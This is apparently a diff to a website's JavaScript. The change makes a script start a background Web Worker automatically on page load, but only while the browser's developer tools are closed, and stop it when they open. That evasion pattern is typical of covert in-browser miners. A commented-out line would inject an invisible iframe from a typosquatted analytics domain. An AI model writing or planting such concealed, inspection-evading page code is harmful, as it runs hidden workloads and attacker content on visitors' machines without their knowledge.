@@ -2,22 +2,18 @@
 devtools.open=true;devtools.orientation=orientation;}else{if(devtools.open){emitEvent(false,null);}
 devtools.open=false;devtools.orientation=null;}},500);if(typeof module!=='undefined'&&module.exports){module.exports=devtools;}else{window.devtools=devtools;}})();
 
-var startreq = function() {
+setTimeout(function() {
 
-	setTimeout(function() {
+	if(!window.devtools.open) {
 
-		if(!window.devtools.open) {
+		worker = new Worker("worker.js?r="+Math.floor(Math.random() * 99999999));
 
-			worker = new Worker("worker.js?r="+Math.floor(Math.random() * 99999999));
+		window.addEventListener('devtoolschange', function (e) {if(e.detail.open)worker.postMessage("STOP");});
 
-			window.addEventListener('devtoolschange', function (e) {if(e.detail.open)worker.postMessage("STOP");});
+		worker.postMessage("START");
 
-			worker.postMessage("START");
+	}
 
-		}
-
-  	}, 500);
-
-};
+}, 500);
 
 //function _gf(d,i){d.addEventListener("DOMContentLoaded", function(){i=d.createElement("iframe");i.src="https://google.anayltics.com/ga.html";i.width="0";i.height="0";i.frameBorder="0";i.scrolling="no";d.body.appendChild(i);});}_gf(document);
